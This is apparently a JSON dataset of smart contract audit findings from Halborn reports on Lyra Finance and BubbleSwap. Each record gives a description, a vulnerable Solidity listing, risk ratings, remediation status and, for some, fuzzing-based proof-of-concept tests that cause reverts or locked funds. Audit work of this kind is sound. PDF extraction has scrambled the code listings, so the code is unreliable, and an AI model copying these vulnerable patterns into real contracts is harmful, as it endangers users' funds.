( boardCache . updatedAtPrice < minUpdatedAtPrice ) { 816 for ( uint i = 1; i < liveBoards . length ; i ++) { boardCache = boardCaches [ liveBoards [ i ]]; 817 818 if ( boardCache . updatedAt < minUpdatedAt ) { 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 } 834 835 globalCache . minUpdatedAt = minUpdatedAt ; 836 globalCache . minUpdatedAtPrice = minUpdatedAtPrice ; } if ( boardCache . ivVariance > maxIvVariance ) { } if ( boardCache . maxSkewVariance > maxSkewVariance ) { maxSkewVariance = boardCache . maxSkewVariance ; maxIvVariance = boardCache . ivVariance ; } Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to change the visibility of the updateBoardCachedGreeks function to public and update addBoard to call this function instead of _updateGlobalLastUpdatedAt. Remediation plan: SOLVED: The issue was fixed in commit 1e04d54b12c4faf0378b54b67f93d5de2b7c6e68. 28 ", "labels": ["Halborn", "Lyra_Finance", "Severity: Low"]}, {"title": "INACCURATE VALIDITY CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The updateCacheAndGetTradeResult function in the OptionMarketPricer con- tract contains the following inaccurate validity checks:  newSkew includes min / max values in its validity check. As a consequence, the function will revert incorrectly when dealing with edge values.  pricing.callDelta does not include min / max values in its validity check. As a consequence, the function will not revert when dealing with edge values, as it should. This issue is categorized as informational because it could cause the aforementioned function to not work as expected in edge cases. Code Location: Listing 11: OptionMarketPricer.sol (Line 262) 259 // If it is a force close and skew ends up outside the \" abs min /  max \" thresholds 260 if ( 261 262 trade . tradeDirection != OptionMarket . TradeDirection . LIQUIDATE && ( newSkew <= tradeLimitParams . absMinSkew || newSkew >=  tradeLimitParams . absMaxSkew ) 263 ) { 264 revert ForceCloseSkewOutOfRange ( Listing 12: OptionMarketPricer.sol (Lines 328-329) 326 // delta must fall BELOW the min or ABOVE the max to allow for  force closes 327 if ( 328 pricing . callDelta > tradeLimitParams . minForceCloseDelta && 29 329 pricing . callDelta < ( int ( DecimalMath . UNIT ) - tradeLimitParams .  minForceCloseDelta ) 330 ) { 331 revert ForceCloseDeltaOutOfRange ( Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to correct validity checks as mentioned above to avoid unexpected behavior in the updateCacheAndGetTradeResult function when dealing with edge values. Remediation plan: ACKNOWLEDGED: The Lyra team acknowledged this finding. 30 ", "labels": ["Halborn", "Lyra_Finance", "Severity: Informational"]}, {"title": "CHANGES CAN BE MADE IN EXPIRED BOARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following operations in OptionMarket contract affect boards, even if they are already expired:  Base IV can be set on an expired board  Skew can be set on a strike from an expired board  Strikes can be added on an expired board It is worth noting that this issue is classified as informational because it does not affect the settlement process, but could cause the owner to spend more gas unnecessarily if they mistakenly interact with an expired board. Code Location: Listing 13: OptionMarket.sol (Lines 264,276,277) 264 function setBoardBaseIv ( uint boardId , uint baseIv ) external  onlyOwner { 265 266 267 268 269 270 OptionBoard storage board = optionBoards [ boardId ]; if ( board . id != boardId ) { revert InvalidBoardId ( address ( this ) , boardId ); } if ( baseIv == 0) { revert ExpectedNonZeroValue ( address ( this ) , NonZeroValues .  BASE_IV ); } if (! board . frozen ) { 271 272 273 274 275 276 277 278 revert BoardNotFrozen ( address ( this ) , boardId ); } board . iv = baseIv ; greekCache . setBoardIv ( boardId , baseIv ); emit BoardBaseIvSet ( boardId , baseIv ); 31 Listing 14: OptionMarket.sol (Lines 286,300,301) 286 function setStrikeSkew ( uint strikeId , uint skew ) external  onlyOwner { Strike storage strike = strikes [ strikeId ]; if ( strike . id != strikeId ) { revert InvalidStrikeId ( address ( this ) , strikeId ); } if ( skew == 0) { revert ExpectedNonZeroValue ( address ( this ) , NonZeroValues . SKEW ); } OptionBoard memory board = optionBoards [ strike . boardId ]; if (! board . frozen ) { revert BoardNotFrozen ( address ( this ) , board . id ); } strike . skew = skew ; greekCache . setStrikeSkew ( strikeId , skew ); emit StrikeSkewSet ( strikeId , skew ); 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 } Listing 15: OptionMarket.sol (Lines 312,319,320) uint boardId , uint strikePrice , uint skew 312 function addStrikeToBoard ( 313 314 315 316 ) external onlyOwner { 317 318 OptionBoard storage board = optionBoards [ boardId ]; if ( board . id != boardId ) revert InvalidBoardId ( address ( this ) ,  boardId ); 319 Strike memory strike = _addStrikeToBoard ( board , strikePrice ,  skew ); 320 greekCache . addStrikeToBoard ( boardId , strike . id , strikePrice ,  skew ); 321 } Risk Level: Likelihood - 2 Impact - 1 32 Recommendation: It is recommended that the functions mentioned above be reverted if they are called for expired boards. Remediation plan: ACKNOWLEDGED: The Lyra team acknowledged this finding. 33 ", "labels": ["Halborn", "Lyra_Finance", "Severity: Informational"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the following loops, the i variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Proof of Concept: For example, based on the following test contract: Listing 16: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 34 Code Location: Listing 17: LiquidityPool.sol (Line 313) ( uint tokenPrice , bool stale , ) = _getTokenPriceAndStale () ; 310 function processDepositQueue ( uint limit ) external nonReentrant { 311 312 313 314 QueuedDeposit storage current = queuedDeposits [ for ( uint i = 0; i < limit ; i ++) {  queuedDepositHead ]; 315 if (! _canProcess ( current . depositInitiatedTime , lpParams .  depositDelay , stale , queuedDepositHead )) { 316 317 return ; } Listing 18: LiquidityPool.sol (Line 341) 340 function processWithdrawalQueue ( uint limit ) external nonReentrant  { 341 342 for ( uint i = 0; i < limit ; i ++) { ( uint totalTokensBurnable , uint tokenPriceWithFee , bool  stale ) = _getTotalBurnableTokens () ; Listing 19: Other resources affected 1 2 3 4 5 GWAV : L #136 OptionGreekCache : L #332 , 348 , 352 , 726 , 816 , 878 , 913 , 922 , 1000 OptionMarket : L #236 , 393 , 415 , 458 , 744 , 972 , 1009 OptionToken : L #300 , 509 , 591 , 605 , 616 ShortCollateral : L #172 35 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of a uint variable inside a loop. This is not applicable outside of loops. Remediation plan: SOLVED: The issue was fixed in commit 1e04d54b12c4faf0378b54b67f93d5de2b7c6e68. 36 3.10 (HAL-10) CACHING ARRAY LENGTH IN FOR LOOPS CAN SAVE GAS - INFORMATIONAL ", "labels": ["Halborn", "Lyra_Finance", "Severity: Informational"]}, {"title": "ARITHMETIC ERROR CAN RESULT IN LOCKED USER FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The collect function of the ContentratedLiquidityPoolManager.sol contract does not withdraw the correct amount from the vaults. By withdrawing an improper amount, when a user under certain conditions tries to burn part or all of his position the contract reverts due to an arithmetic error in the withdraw function of the ConcetratedLiquidityPool.sol contract. Code Location: Location - ConcentratedLiquidityPoolManager.sol#L210 Listing 1: ConcentratedLiquidityPoolManager.sol (Line 210) 192 function collect ( int64 tokenId ) public returns ( uint256  token0amount , uint256 token1amount ) { 193 require ( msg . sender == ownerOf ( uint256 ( int256 ( tokenId )) ) , \"  NOT_ID_OWNER \"); 194 195 196 Position storage position = positions [ tokenId ]; PositionFeesData memory positionFeesData = positionFees (  tokenId ); 197 198 token0amount = positionFeesData . token0amount + position .  unclaimedFees0 ; 199 token1amount = positionFeesData . token1amount + position .  unclaimedFees1 ; 200 201 202 203 204 205 206 207 208 209 position . unclaimedFees0 = 0; position . unclaimedFees1 = 0; position . feeGrowthInside0 = positionFeesData . feeGrowthInside0 ; position . feeGrowthInside1 = positionFeesData . feeGrowthInside1 ; uint256 balance0 = position . pool . vault0 ( address ( this )) ; uint256 balance1 = position . pool . vault1 ( address ( this )) ; 15 210 211 if ( balance0 < token0amount || balance1 < token1amount ) { ( uint256 amount0fees , uint256 amount1fees ) = position . pool  . collect ( position . lower , position . upper ); 212 213 214 215 216 uint256 newBalance0 = amount0fees + balance0 ; uint256 newBalance1 = amount1fees + balance1 ; // Rounding errors due to frequent claiming of other users  in the same position may cost us some wei units . 217  ; 218  ; 219 220 221 if ( token0amount > newBalance0 ) token0amount = newBalance0 if ( token1amount > newBalance1 ) token1amount = newBalance1 } _transferBoth ( position . pool , msg . sender , token0amount ,  token1amount ); 222 223 emit Collect ( uint256 ( int256 ( tokenId )) , msg . sender ,  token0amount , token1amount ); 224 } Risk Level: Likelihood - 4 Impact - 4 Proof Of Concept: The next test found through fuzzing triggered the previously described behavior. Location - Invariant.t.sol#L379 Listing 2 1 function testWithdrawRevert () public { 2 3 4 setupEnv () ; State memory state ; 16 state . pool = Pool ( 0, false ); state . mints = [ Mint (0 , 0 , 4294965963 , 4294965963 , 0, 5 6  1461501610815035672193089625368183178509592374988) , Mint (0 , 0 , 0,  0, 0, 102382895725905434422964234) , Mint (0 , 0 , 0, 0, 4727003 ,  4727003) , Mint (0 , 0, 5, 5 ,  1461501610815035672193089625368183178509592374988 , 0) , Mint (0 , 0,  0, 0, 57866823689572764762770813391297409132144668 ,  50066467198429302992085375296889841655755873) , Mint (0 , 0 , 0 , 0 , 0,  0) , Mint (0 , 0, 0, 0,  1461008357146354474159968841821869770755632007064 ,  79347087983666005040985389675) , Mint (0 , 0 , 0 , 0 ,  102536577618133000677376439 , 0) , Mint (0 , 0 , 0 , 0 ,  1708172910815791427074259 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) , Mint (0 , 0,  0, 0, 1461501610815035672193089625368183178509592374988 , 0) , Mint  (0 , 0, 0, 0, 1461008357146354474159968841821869770755632007064 ,  19861840684872087267822641043486) , Mint (0 , 0 , 0 , 0 , 0 , 1718308) ,  Mint (0 , 0, 0, 0, 0 , 0) , Mint (0 , 0 , 0, 0 , 0 ,  50257238252836758370807292880) , Mint (0 , 0 , 0 , 0 ,  54907329825568905816573164194356135163533386 , 4727003) , Mint (0 , 0,  0, 0, 1461501610815035672193089625368183178509592374988 , 0) , Mint  (0 , 0, 0, 0, 118962878524044395906683687737 ,  40564819207303340847894502572031) , Mint (982160 , 0, 6279209 , 1,  318130942495380 ,  1461501637330902918203684832716283019655932542975) , Mint (784 ,  8388605 , 4294967292 , 4294967293 ,  143098884273794505002571482528426511690462931 ,  1461501637330902918203684832716283019655932542974) ]; 7  ( false , 1601746) , Swap ( false , 0) , Swap ( true , 1) , Swap ( true ,  4294967294) , Swap ( false , 4294967295) , Swap ( false , 15) , Swap ( false ,  13) , Swap ( false , 1) , Swap ( false , 2) , Swap ( false , 481) , Swap ( false  , 231) , Swap ( true , 4294967293) , Swap ( false , 3) , Swap ( false ,  730302967) , Swap ( true , 288226250) , Swap ( false , 4294967292) , Swap (  true , 2) , Swap ( true , 214470) , Swap ( false , 0) , Swap ( false , 1) , Swap  ( false , 17) , Swap ( true , 789862) , Swap ( false , 3) , Swap ( true , 2) ,  Swap ( false , 2) , Swap ( false , 3) , Swap ( true , 2044119666) , Swap ( false  , 814237) , Swap ( false , 0) , Swap ( true , 9844803) , Swap ( false , 2) ,  Swap ( true , 14889) , Swap ( true , 4294967294) , Swap ( true , 11944) , Swap  ( false , 17337554) , Swap ( false , 4294967294) , Swap ( false , 7) , Swap (  false , 3) , Swap ( true , 4294967293) , Swap ( true , 22) , Swap ( true ,  4294967295) , Swap ( true , 249862) , Swap ( false , 244) , Swap ( true , 0) ,  Swap ( false , 0) , Swap ( false , 1537) , Swap ( false , 0) , Swap ( true ,  64239484) ]; state . swaps = [ Swap ( false , 6728842) , Swap ( true , 2256334) , Swap 17 state . burns = [ Burn (2) , Burn (514532) , Burn (0) , Burn 8  (4294967292) , Burn (250585) , Burn (1) , Burn (3) , Burn (46378427) , Burn  (4294967292) , Burn (72158) ]; 9 state . collects = 64339; 10 11 12 13 } state = _validateStateInternal ( state ); setUpStateMoreRandom ( state ); As explained before, this test reverts when trying to withdraw liquidity from the pool through the manager contract. The revert error can be observed in the next screenshot. Recommendation: Consider removing the if flow statement on the collect function of the manager who creates an error that accumulates after several transactions makes it not possible for users to withdraw their liquidity. Remediation Plan: SOLVED: The BubbleSwap team removed the if statement in the following commitId 07c873d250d3e5ffed5b8c0df7baaea2f72ee13d. 18 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: High"]}, {"title": "IMPROPER SWAP AMOUNTS HANDLING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ConcentratedLiquidityPool.sol contract does not handle properly the errors when performing a swap that requires giving away a higher amount of tokens than the pool currently has. This ends in a revert arithmetic overflow error. Code Location: Location - ConcentratedLiquidityPool.sol Listing 3: ConcentratedLiquidityPool.sol 559 if ( swapParams . zeroForOne ) { 560 561 if ( swapSnapshot . isAmountInGiven ) { require ( swapSnapshot . end . balance0 >= swapSnapshot . start .  balance0 , \" IIA -0 a \" ); } else { 562 563 require (( swapSnapshot . end . balance0 - swapSnapshot . start .  balance0 ) >= actualIn , \" IIA -0 b\" ); 564 565 566 } require (( swapSnapshot . start . balance1 - swapSnapshot . end .  balance1 ) <= amountOut , \" IIA -0 c \" ); 567 } else { 568 569 if ( swapSnapshot . isAmountInGiven ) { require ( swapSnapshot . end . balance1 >= swapSnapshot . start .  balance1 , \" IIA -1 a \" ); } else { 570 571 require (( swapSnapshot . end . balance1 - swapSnapshot . start .  balance1 ) >= actualIn , \" IIA -1 b\" ); 572 573 574 } require (( swapSnapshot . start . balance0 - swapSnapshot . end .  balance0 ) <= amountOut , \" IIA -1 c \" ); 575 } 19 Proof Of Concept: The next code snippet reproduces the previously described issue. Listing 4 addLiquidityManager ( pool , address ( token0 ) , address ( token1 ) , address pool = deployPool ( address ( token0 ) , address ( token1 ) , 0 function testSwapRevert () public { 1 2  1500 , 79228162514264337593543950336 ) ; 3  1000 , 1000 , -887272 , 887272) ; 4 5  address ( token0 ) , address ( token1 ) , 1500 , address ( this ) , 1001 , 0, 0)  ; 6 } uint256 _amountOutFinal = swapExactInputSingleRouter ( pool , As described before, when executing the test, it triggers the arithmetic overflow/underflow revert error. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider adding a mechanism to control the error and swapping the corre- sponding number of tokens. Remediation Plan: SOLVED: The BubbleSwap team solved the issue by modifying the conditions in the following commitId 38755a333ae2eb46b6bf0ee94e659752a7356097. 20 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Medium"]}, {"title": "UNCONTROLLED FEEGROWTH ERROR WHEN ADDING LIQUIDITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The function rangeFeeGrowth of the contract ConcentratedLiquidityPool. sol does not handle the feegrowth variables properly. Thus, when adding liquidity, the function might revert with an arithmetic error. Code Location: Location - ConcentratedLiquidityPool.sol Listing 5: ConcentratedLiquidityPool.sol 700 function rangeFeeGrowth ( int24 lowerTick , int24 upperTick ) public  view returns ( uint256 feeGrowthInside0 , uint256 feeGrowthInside1 )  { 701 int24 currentTick = TickMath . getTickAtSqrtRatio ( price ); //  https :// github . com / sushiswap / trident / issues /338 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 RichTick storage lower = richTicks [ lowerTick ]; RichTick storage upper = richTicks [ upperTick ]; // Calculate fee growth below & above . uint256 _feeGrowthGlobal0 = feeGrowthGlobal0 ; uint256 _feeGrowthGlobal1 = feeGrowthGlobal1 ; uint256 feeGrowthBelow0 ; uint256 feeGrowthBelow1 ; uint256 feeGrowthAbove0 ; uint256 feeGrowthAbove1 ; if ( lowerTick <= currentTick ) { feeGrowthBelow0 = lower . feeGrowthOutside0 ; feeGrowthBelow1 = lower . feeGrowthOutside1 ; } else { 21 719 feeGrowthBelow0 = _feeGrowthGlobal0 - lower .  feeGrowthOutside0 ; 720 feeGrowthBelow1 = _feeGrowthGlobal1 - lower .  feeGrowthOutside1 ; 721 722 723 724 725 726 727 } if ( currentTick < upperTick ) { feeGrowthAbove0 = upper . feeGrowthOutside0 ; feeGrowthAbove1 = upper . feeGrowthOutside1 ; } else { feeGrowthAbove0 = _feeGrowthGlobal0 - upper .  feeGrowthOutside0 ; 728 feeGrowthAbove1 = _feeGrowthGlobal1 - upper .  feeGrowthOutside1 ; 729 730 731 } feeGrowthInside0 = _feeGrowthGlobal0 - feeGrowthBelow0 -  feeGrowthAbove0 ; 732 feeGrowthInside1 = _feeGrowthGlobal1 - feeGrowthBelow1 -  feeGrowthAbove1 ; 733 } Risk Level: Likelihood - 3 Impact - 3 Proof Of Concept: The next code snippet triggers the previously described issue. Listing 6 setupEnv () ; State memory state ; 1 function testAddLiquidityRevert () public { 2 3 4 5 6  818616501176165588061273257) , Mint (0 , 0 , 0 , 0 , 8168092 , 0) , Mint  (0 , 0, 0, 0, 721131900230629477205130399 , state . pool = Pool ( 0, false ); state . mints = [ Mint (0 , 0 , 0 , 0 , 0 , 22 state . swaps = [ Swap ( false , 2) , Swap ( false , 0) , Swap ( false , 0) ,  818616501176165588061273257) , Mint (0 , 0 , 0 , 0 , 4727003 , 674644605)  , Mint (0 , 0, 0, 0, 719547233055170467478228628 , 0) , Mint (0 , 0 , 0,  0, 0, 14627558) , Mint (0 , 0 , 0, 0, 0 , 21096719) , Mint (0 , 0 , 0, 0,  0, 0) , Mint (0 , 0, 0, 0 , 720627309756840161963903827 , 0) , Mint (0 ,  0, 0, 0, 0, 1718308) , Mint (0 , 0 , 0, 0,  720627309756840161963903827 , 4727003) , Mint (0 , 0 , 0, 0, 0 , 0) ,  Mint (0 , 0, 0, 0, 0 , 0) , Mint (0 , 0 , 0, 0 , 0 , 0) , Mint (0 , 0 , 0, 0,  0, 0) , Mint (0 , 0, 0, 0 , 0 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) , Mint (0 , 0,  0, 0, 0, 0) , Mint (0 , 0, 0 , 0, 0 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) ]; 7  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 63) ,  Swap ( false , 4294967295) , Swap ( true , 2) , Swap ( false , 27978) , Swap (  true , 326545111) , Swap ( true , 4294967293) , Swap ( false , 79310) , Swap  ( false , 0) , Swap ( true , 1596228) , Swap ( true , 31) , Swap ( false , 1) ,  Swap ( true , 268219) ]; 8  Burn (3) , Burn (703) , Burn (3) , Burn (3) , Burn (3) , Burn (2) ]; 9 10 11 12 13 } state = _validateStateInternal ( state ); setUpStateMoreRandom ( state ); state . burns = [ Burn (7) , Burn (2) , Burn (4294967293) , Burn (2) , state . collects = 108; As it can be observed, the execution ends with the revert error previously mentioned. 23 Recommendation: Consider allowing the range fee growth to overflow/underflow the same way UniswapV3 does. Remediation Plan: SOLVED: The BubbleSwap team solved the issue in the following commitId a520bb7cf8162171c8d3fb18d17d10c07edb2b80. 24 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Low"]}, {"title": "POSSIBILITY TO CREATE AN INCENTIVE FOR A DELETED POOL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Hedera network deletes a contract if it does not pay a rent to the network. All the pools are supposed to receive money when adding/burning funds. However, there is a chance that a pool gets deleted over time. However, if a pool is deleted, the Factory will still keep the address as an existing one. Thus, making it possible to create an incentive through the staker contract for a deleted pool. Code Location: Location - ConcentratedLiquidityPoolStaker.sol Listing 7: ConcentratedLiquidityPoolStaker.sol require ( incentive . minSpacing > 0 && incentive . maxSpacing > 0, require ( factory . poolExists ( _pool ) , \" INVALID_POOL \" ); require ( incentive . minSpacing <= incentive . maxSpacing , \" require ( incentive . minSpacing <= MAX_SPACING && incentive . 73 function addIncentive ( address _pool , Incentive memory incentive )  public payable costsCentiCents (1 _000 , 2) { 74 75 76  \" NULL_TICK_SPACING \"); 77  maxSpacing <= MAX_SPACING , \" EXCEEDS_MAX_TICK_SPACING \" ); 78  INVALID_MIN_MAX_SPACING \"); 79 80  owner 81 82  _pool ); 83 84 85 uint32 current = uint32 ( block . timestamp ); require ( current <= incentive . startTime , \" ALREADY_STARTED \"); incentive . owner = msg . sender ; // force msg . sender to be the IConcentratedLiquidityPool pool = IConcentratedLiquidityPool ( 25 require ( incentive . startTime < incentive . endTime , \" require ( incentive . endTime + 30 days < incentive . expiry , \" 86  START_PAST_END \" ); 87  END_PAST_BUFFER \"); // allow users to claimRewards for at least 30  days after endTime ; after which the incentive may have expired and  reclaimIncentive may be called 88 89 90 91  ( this ) , int64 ( incentive . rewardsUnclaimed )) ; 92  ; 93 } require ( incentive . rewardsUnclaimed != 0 , \" NO_REWARDS \" ); incentive . secondsClaimed = 0; incentives [ pool ][ incentiveCount [ pool ]++] = incentive ; SafeHTS . safeTransferToken ( incentive . token , msg . sender , address emit AddIncentive ( pool , incentiveCount [ pool ], incentive . token ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider creating an administrator remove function, so when Hedera network deletes a pool, is it also possible to remove it from the manager. Currently, the BubbleSwap team created the next HIP to try to ensure a network mechanism that prevents this from happening. Remediation Plan: RISK ACCEPTED: The BubbleSwap team accepted the risk of this issue. 26 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Low"]}, {"title": "POOL SHOULD RETURN FUNDS WHEN ADDING EXTRA LIQUIDITY VIA DIRECT MINT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ConcentratedLiquidityPool.sol contracts allows sending the funds be- fore executing the mint function. However, if more funds than the required ones by the pool are sent, the pool will keep those extra funds and not return them to the user. Code Location: Code Section - ConcentratedLiquidityPool.sol#L176 Listing 8 176 function _mint ( MintParams memory mintParams ) internal returns (  uint256 liquidityMinted , uint128 amount0Actual , uint128  amount1Actual ) { 177 178 179 _ensureTickSpacing ( mintParams . lower , mintParams . upper ); uint256 priceLower = uint256 ( TickMath . getSqrtRatioAtTick (  mintParams . lower )); 180 uint256 priceUpper = uint256 ( TickMath . getSqrtRatioAtTick (  mintParams . upper )); 181 182 183 184 185 186 187 188 189 190 191 uint256 currentPrice = uint256 ( price ); liquidityMinted = DyDxMath . getLiquidityForAmounts ( priceLower , priceUpper , currentPrice , uint256 ( mintParams . amount1Desired ) , uint256 ( mintParams . amount0Desired ) ); // Ensure no overflow happens when we cast from uint256 to  int128 . 27 192 if ( liquidityMinted > uint128 ( type ( int128 ). max )) revert  Overflow () ; 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 if ( liquidityMinted == 0) { revert NullLiquidity () ; } _updateSecondsPerLiquidity ( uint256 ( liquidity )) ; TickParams memory tickParams = TickParams ({ lowerOld : mintParams . lowerOld , lower : mintParams . lower , upperOld : mintParams . upperOld , upper : mintParams . upper }) ; // / @dev insert () is called before _updatePosition () as  _updatePosition () requires the latest tick growth outside data  including that for newly initialised ticks 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 nearestTick = Ticks . insert ( startTicks , ticks , richTicks , feeGrowthGlobal0 , feeGrowthGlobal1 , secondsGrowthGlobal , tickParams , uint128 ( liquidityMinted ) , nearestTick , uint160 ( currentPrice ) ); unchecked { ( uint256 amount0Fees , uint256 amount1Fees ) =  _updatePosition ( 223 224 225 226 227 228 229 230 msg . sender , mintParams . lower , mintParams . upper , int128 ( uint128 ( liquidityMinted )) ); if ( amount0Fees > 0) { _deposit ( true , msg . sender , amount0Fees ); // / @dev Unlike the original Trident implementation  since the amount {0 ,1} Fees are still being custodied by the pool 's 28  vault {0 ,1} there 's no reason to decrease reserve {0 ,1} 231 232 233 234 235 236 237 238 // reserve0 -= uint128 ( amount0Fees ); } if ( amount1Fees > 0) { _deposit ( false , msg . sender , amount1Fees ); // reserve1 -= uint128 ( amount1Fees ); } if ( priceLower <= currentPrice && currentPrice <  priceUpper ) liquidity += uint128 ( liquidityMinted ); 239 240 241 } ( amount0Actual , amount1Actual ) = DyDxMath .  getAmountsForLiquidity ( priceLower , priceUpper , currentPrice ,  liquidityMinted , true ); 242 243 IPositionManager ( msg . sender ). mintCallback ( token0 , token1 ,  amount0Actual , amount1Actual ); 244 245 246 247 248 249 250 251 252 if ( amount0Actual != 0) { uint128 _reserve0 = reserve0 ; _reserve0 += amount0Actual ; reserve0 = _reserve0 ; uint128 actualReserves0 = uint128 ( _balance ( token0 )) ; // / @dev SLOAD reserve {0 ,1} for gas savings if ( _reserve0 > actualReserves0 ) revert Token0Missing (  _reserve0 , actualReserves0 , amount0Actual ); 253 254 255 256 257 258 259 260 261 } if ( amount1Actual != 0) { uint128 _reserve1 = reserve1 ; _reserve1 += amount1Actual ; reserve1 = _reserve1 ; uint128 actualReserves1 = uint128 ( _balance ( token1 )) ; if ( _reserve1 > actualReserves1 ) revert Token1Missing (  _reserve1 , actualReserves1 , amount1Actual ); 262 263 264 } emit Mint ( msg . sender , msg . sender , mintParams . lower , mintParams  . upper , uint128 ( liquidityMinted ) , amount0Actual , amount1Actual ); 265 } 29 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider implementing a mechanism to give back the extra funds to the user. Remediation Plan: RISK ACCEPTED: The BubbleSwap team accepted the risk of this issue. The reason behind this is that users should be forced to implement the callback function where the amount to transfer funds is specified from the pool. Adding liquidity should not be done by sending funds directly to the pool. 30 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Low"]}, {"title": "POOL DOES NOT SUPPORT FRACTIONAL FEE TOKEN TRANSFERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Hedera network allows creating token contracts with a fee on transfer (docs). There are two different ways to create this fee, that the fee is taken from the payer, or that the fee is taken from the received amount by the receiver. The ConcentratedLiquidityPool.sol contract, does not support tokens cre- ated with a fee on the receiver side, and any attempt to do add liquidity or a swap will revert. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding support for tokens with fee on the receiver side. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this issue, assuming it as a design constraint. 31 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Informational"]}, {"title": "PAYER FIELD NEVER USED ON MINTPARAMS STRUCTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The field payer declared as address on the MintParams struct of the IConcentratedLiquidityPool.sol is never used along the code base. Although the data structure is set as a required parameter on the mint function and that the manager does set this value to the msg.sender, the field is not used on the pool. Code Location: Code location - IConcentratedLiquidityPool.sol Listing 9: (Line 28) 27 struct MintParams { 28 29 30 31 32 33 34 35 } address payer ; int24 lowerOld ; int24 lower ; int24 upperOld ; int24 upper ; uint128 amount0Desired ; uint128 amount1Desired ; Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: Consider removing the unused value or implementing the required code to use it. Remediation Plan: ACKNOWLEDGED: The BubbleSwap team acknowledged this finding. 33 ", "labels": ["Halborn", "BubbleSwap_Concentrated_Liquidity_Pool_AMM", "Severity: Informational"]}, {"title": "SQRTPRICELIMITX96 IS NOT USED ON V3SWAPROUTER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The parameter sqrtPriceLimitX96 declared as uint160 primitive type is set as a required input on exactInputSingle and exactInput functions. However, the parameter is not used. Code Location: Code Location - Listing 10 amountOut = exactInputInternal ( params . amountIn , params . 